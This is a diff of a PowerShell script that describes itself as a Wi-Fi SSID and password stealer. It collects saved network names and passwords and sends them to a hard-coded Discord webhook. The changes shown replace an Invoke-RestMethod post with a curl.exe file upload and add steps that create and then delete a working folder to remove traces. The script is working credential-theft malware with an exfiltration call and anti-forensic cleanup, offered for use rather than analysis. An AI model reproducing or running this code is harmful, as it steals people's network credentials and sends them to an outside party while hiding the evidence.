@@ -1,5 +1,10 @@
 #Wifi SSID and password stealer
-#Sends out saved Wifi networks and the password if available
+#Sends out saved Wifi networks and the password if it is available
+
+#Create directory to hold contents
+$folder = "C:\wifiii"
+mkdir $folder
+cd $folder
 
 #Yes I know this url shouldn't be publicly displayed
 $webhookUrl  = 'https://discord.com/api/webhooks/1168997833945403443/b9KVbM7c72rekuk8um12U5Uz_9Elu_tz5aLeFKgzYBpK4MSQepewl3iDPtt4RrMGV3oG'
@@ -45,11 +50,12 @@ foreach($network in $names)
 	$result += $combo
 }
 
-#Discord webhook send code from I-Am-Jakoby
-$Body = @{
-	'username' = $env:username
-	'content' = "----------------------------`n`n" + $result + "`n`n"
-}
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl  -Method Post -Body ($Body | ConvertTo-Json)
-
+#Create output file with all the info
+Out-File wifi.txt -Append -InputObject $result
+$file = Join-Path -Path $PWD -ChildPath "wifi.txt"
+#Send the file out
+curl.exe -F "file1=@$file" $webhookURL
+#Clean up any trace
+cd ..
+rmdir wifiii -Recurse
 EXIT
